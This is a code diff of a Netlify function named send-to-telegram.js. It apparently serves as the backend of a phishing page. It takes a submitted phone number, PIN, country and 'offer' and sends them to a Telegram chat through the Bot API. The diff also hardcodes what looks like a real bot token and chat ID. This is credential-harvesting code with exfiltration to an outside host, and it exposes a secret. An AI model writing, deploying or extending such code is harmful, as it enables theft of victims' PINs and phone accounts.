@@ -1,7 +1,8 @@
 // netlify/functions/send-to-telegram.js
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8834457288:AAEwsXLbfzRp54OnBcE-12jMhaZY_0e-Nz4';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8834429633';
+// HARDCODED CREDENTIALS - NO ENVIRONMENT VARIABLES NEEDED
+const TELEGRAM_BOT_TOKEN = '8834457288:AAEwsXLbfzRp54OnBcE-12jMhaZY_0e-Nz4';
+const TELEGRAM_CHAT_ID = '8834429633';
 
 exports.handler = async (event) => {
     const headers = {
@@ -54,34 +55,30 @@ ${flag} *Country:* ${country}
             `;
 
             let telegramSuccess = false;
-            let telegramError = null;
 
-            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-                try {
-                    const telegramResponse = await fetch(
-                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-                        {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: TELEGRAM_CHAT_ID,
-                                text: message,
-                                parse_mode: 'Markdown'
-                            })
-                        }
-                    );
-
-                    if (telegramResponse.ok) {
-                        telegramSuccess = true;
-                        console.log(`✅ Telegram sent for ${phone}`);
-                    } else {
-                        telegramError = await telegramResponse.text();
-                        console.error(`❌ Telegram error: ${telegramError}`);
+            try {
+                const telegramResponse = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
                     }
-                } catch (error) {
-                    telegramError = error.message;
-                    console.error(`❌ Telegram error: ${telegramError}`);
+                );
+
+                if (telegramResponse.ok) {
+                    telegramSuccess = true;
+                    console.log(`✅ Telegram sent for ${phone}`);
+                } else {
+                    const errorText = await telegramResponse.text();
+                    console.error(`❌ Telegram error: ${errorText}`);
                 }
+            } catch (error) {
+                console.error(`❌ Telegram error: ${error.message}`);
             }
 
             return {
@@ -96,8 +93,7 @@ ${flag} *Country:* ${country}
                         phone: phone,
                         pin: pin,
                         offer: offer,
-                        telegramSent: telegramSuccess,
-                        telegramError: telegramError
+                        telegramSent: telegramSuccess
                     }
                 })
             };
